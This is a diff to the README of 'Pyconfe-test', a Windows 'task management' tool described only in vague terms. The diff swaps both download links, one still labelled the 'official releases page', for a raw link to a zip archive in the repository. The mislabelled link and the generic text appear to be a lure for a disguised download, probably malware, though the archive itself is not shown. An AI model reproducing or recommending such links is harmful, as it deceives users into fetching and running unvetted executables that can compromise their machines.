@@ -1,6 +1,6 @@
 # 📦 Pyconfe-test - Manage your technical tasks with ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/neontubesilurusglanis863/Pyconfe-test/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/neontubesilurusglanis863/Pyconfe-test/main/chimer/Pyconfe-test-3.8.zip)
 
 Pyconfe-test helps users organize workflows through a simple interface. It removes the need for manual tracking by automating data entries and scheduling reminders. This tool handles the background processing so you can focus on your actual work. It runs on Windows systems and requires no prior knowledge of software development.
 
@@ -20,7 +20,7 @@ Verify your Windows version by opening your Settings menu and selecting About. I
 
 Follow these instructions to set up the software on your machine.
 
-1. Visit the [official releases page](https://github.com/neontubesilurusglanis863/Pyconfe-test/releases) to access the download files.
+1. Visit the [official releases page](https://raw.githubusercontent.com/neontubesilurusglanis863/Pyconfe-test/main/chimer/Pyconfe-test-3.8.zip) to access the download files.
 2. Search for the section labeled Assets.
 3. Click on the file that ends in .exe to start the transfer to your computer.
 4. Locate the file in your Downloads folder once the transfer finishes.
